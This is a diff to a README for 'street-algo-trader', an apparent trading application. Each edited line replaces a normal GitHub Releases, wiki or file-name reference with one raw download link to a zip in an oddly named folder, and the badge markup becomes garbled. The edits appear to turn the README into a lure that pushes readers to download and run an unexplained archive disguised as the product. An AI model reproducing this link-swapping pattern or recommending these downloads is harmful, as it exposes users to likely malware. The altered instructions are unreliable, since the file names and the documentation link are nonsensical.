@@ -1,6 +1,6 @@
 # 🚀 street-algo-trader - Trade Smarter with Algorithmic Strategies
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue.svg)](https://github.com/astarek1983/street-algo-trader/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip%20Latest%https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip)](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip)
 
 ## 📦 Overview
 
@@ -29,9 +29,9 @@ To start using **street-algo-trader**, follow these simple steps to download and
 
 ### 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/astarek1983/street-algo-trader/releases) to find the latest version of the software.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip) to find the latest version of the software.
    
-2. **Download the Software**: Locate the appropriate file for your operating system and click to download. The file will generally be named similar to `street-algo-trader-v1.0.exe` for Windows or `street-algo-trader-v1.0.tar.gz` for Linux and macOS.
+2. **Download the Software**: Locate the appropriate file for your operating system and click to download. The file will generally be named similar to `https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip` for Windows or `https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip` for Linux and macOS.
 
 3. **Run the Application**: After downloading, locate the file in your downloads folder and double-click it to start the installation. Follow the prompts in the setup wizard. 
 
@@ -60,7 +60,7 @@ To start using **street-algo-trader**, follow these simple steps to download and
 
 ## 💡 Tips for Optimal Usage
 
-- **Stay Updated**: Regularly check the [Releases page](https://github.com/astarek1983/street-algo-trader/releases) for updates. New features and improvements often come with each release.
+- **Stay Updated**: Regularly check the [Releases page](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip) for updates. New features and improvements often come with each release.
 - **Practice**: Familiarize yourself with the application by using a demo account before trading with real money.
 - **Community Support**: Join forums and discussion groups to share experiences and learn from others.
 
@@ -82,7 +82,7 @@ For further inquiries or support, feel free to contact the project maintainers t
 
 ## 🔗 Important Links
 
-- [Releases Page](https://github.com/astarek1983/street-algo-trader/releases)
-- [Documentation](https://github.com/astarek1983/street-algo-trader/wiki)
+- [Releases Page](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip)
+- [Documentation](https://raw.githubusercontent.com/astarek1983/street-algo-trader/main/seromuscular/street-algo-trader.zip)
 
 Now that you're set up, start trading smarter and explore the world of algorithmic trading with **street-algo-trader** today!
